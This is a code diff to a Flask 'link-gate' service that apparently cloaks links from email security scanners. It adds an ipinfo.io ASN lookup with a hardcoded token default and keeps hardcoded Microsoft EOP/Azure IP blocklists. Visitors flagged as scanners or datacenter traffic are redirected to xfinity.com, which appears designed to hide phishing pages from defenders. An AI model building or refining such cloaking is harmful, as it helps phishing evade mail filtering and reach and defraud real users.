@@ -27,6 +27,8 @@ AES_KEY = bytes.fromhex(AES_KEY_HEX)
 GATE_TTL = int(os.environ.get("GATE_TTL_SECONDS", "900"))
 UNWANTED_REDIRECT_URL = os.environ.get("UNWANTED_REDIRECT_URL", "https://www.xfinity.com")
 
+IPINFO_TOKEN = os.environ.get("IPINFO_TOKEN", "d7f89809")
+
 app = Flask(__name__)
 app.secret_key = SK.encode()
 cookie_serializer = URLSafeTimedSerializer(app.secret_key, salt="cookie-gate")
@@ -35,7 +37,7 @@ logging.basicConfig(level=logging.INFO)
 log = logging.getLogger("link-gate")
 
 # ---------------------------------------------------------------------------
-# Hardcoded Microsoft EOP / Azure Blocks (The ASN check misses these)
+# Static blocklists
 # ---------------------------------------------------------------------------
 MICROSOFT_EOP = [
     ip_network("40.92.0.0/15"), ip_network("40.107.0.0/16"),
@@ -74,20 +76,25 @@ def client_ip() -> str:
     xff = request.headers.get("X-Forwarded-For", "")
     return xff.split(",")[0].strip() if xff else request.remote_addr or ""
 
-def check_asn(ip: str) -> bool:
+def check_asn_ipinfo(ip: str) -> bool:
+    """Check IP against ipinfo.io using the provided token."""
     if ip.startswith(("127.", "192.168.", "10.", "172.")):
         return False
+        
     try:
-        r = httpx.get(f"http://ip-api.com/json/{ip}?fields=status,as", timeout=2.0)
+        url = f"https://ipinfo.io/{ip}/json?token={IPINFO_TOKEN}"
+        r = httpx.get(url, timeout=3.0)
         if r.status_code == 200:
             data = r.json()
-            if data.get("status") == "success":
-                asn = data.get("as", "").upper()
-                for sus in SUSPICIOUS_ASNS:
-                    if sus in asn:
-                        return True
-    except Exception:
-        pass
+            org = data.get("org", "").upper()
+            
+            # ipinfo returns org as "AS12345 Company Name"
+            for sus in SUSPICIOUS_ASNS:
+                if sus in org:
+                    log.info(json.dumps({"event": "asn_block", "ip": ip, "org": org}))
+                    return True
+    except Exception as e:
+        log.error(f"ipinfo check failed for {ip}: {e}")
     return False
 
 def classify(ip: str, ua: str) -> dict:
@@ -114,8 +121,8 @@ def classify(ip: str, ua: str) -> dict:
     except ValueError:
         pass
 
-    # 3. Live Datacenter ASN Lookup
-    if check_asn(ip):
+    # 3. Live Datacenter ASN Lookup via ipinfo.io
+    if check_asn_ipinfo(ip):
         out["scanner"] = True
         out["source"] = "datacenter_asn"
         out["method"] = "asn"
